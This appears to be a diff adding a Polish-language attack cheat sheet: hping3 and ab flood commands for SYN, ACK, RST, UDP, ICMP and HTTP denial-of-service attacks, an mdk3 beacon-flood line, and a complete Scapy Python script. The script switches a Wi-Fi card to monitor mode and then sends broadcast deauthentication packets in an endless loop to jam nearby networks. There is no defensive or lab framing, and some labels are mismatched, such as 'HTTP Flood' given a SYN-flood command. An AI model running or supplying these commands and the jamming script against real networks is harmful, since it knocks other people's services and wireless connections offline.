@@ -1,0 +1,82 @@
+Automatyczna skanowanie Wi-Fi: Wifite 
+
+POLECENIA DO WYKONANIA ATAKÓW DoS
+ 
+- SYN Flood -
+sudo hping3 -S -p [port] --flood [numer_ip]
+ 
+- HTTP Flood -  
+hping3 -S -p [port] --flood [numer_ip]
+ 
+- HTTP GET Flood - (
+ab -n 100000 -c 1000 [numer_ip]
+ 
+- TCP RST Flood -  
+hping3 -R -p [port] --flood [numer_ip]
+ 
+- UDP Flood - 
+hping3 --udp -p [port] --flood [numer_ip]
+ 
+- ICMP Flood - Ping of Dead - (wysyłanie dużych pakietów ping na IP maszyny)
+ping -s 65507 -c 100 [numer_ip]
+ 
+-ACK Flood -
+sudo hping3 -A -p [port] --flood [numer_ip]
+
+ZAKŁOCENIA
+
+mdk3 wlan0mon b -c [kanał] # beacon floof
+narzedzie JamWiFi
+
+Skrypt do zagluszania
+
+from scapy.all import *
+import os
+import time
+
+def enable_monitor_mode(interface):
+    print(f"[*] Włączanie trybu monitorowania dla interfejsu {interface}")
+    os.system(f"sudo ifconfig {interface} down")
+    os.system(f"sudo iwconfig {interface} mode monitor")
+    os.system(f"sudo ifconfig {interface} up")
+    print(f"[*] Tryb monitorowania włączony dla {interface}")
+
+def deauth(target, ap, interface):
+    """
+    Funkcja wysyłająca pakiety deautoryzacyjne.
+    """
+    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)
+    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    sendp(packet, iface=interface, count=100, inter=0.1, verbose=0)
+
+def scan_networks(interface):
+    """
+    Skanowanie dostępnych sieci Wi-Fi.
+    """
+    print("[*] Skanowanie sieci...")
+    sniff(iface=interface, timeout=10, prn=lambda x: x.summary())
+    print("[*] Skanowanie zakończone.")
+
+def start_jamming(interface):
+    print(f"[*] Rozpoczynanie zakłócania na interfejsie {interface}")
+    ap_broadcast = "FF:FF:FF:FF:FF:FF"  # Broadcast
+    while True:
+        deauth(ap_broadcast, ap_broadcast, interface)
+        print("[*] Wysłano pakiety deautoryzacyjne...")
+        time.sleep(1)
+
+if __name__ == "__main__":
+    interface = input("Podaj nazwę interfejsu Wi-Fi w trybie monitorowania (np. wlan0mon): ")
+    enable_monitor_mode(interface)
+    try:
+        scan_networks(interface)
+        print("[*] Rozpoczynam zakłócanie sieci.")
+        start_jamming(interface)
+    except KeyboardInterrupt:
+        print("\n[!] Przerwano przez użytkownika. Wyłączanie trybu monitorowania...")
+        os.system(f"sudo ifconfig {interface} down")
+        os.system(f"sudo iwconfig {interface} mode managed")
+        os.system(f"sudo ifconfig {interface} up")
+        print("[*] Tryb monitorowania wyłączony. Do widzenia!")
+
+ 
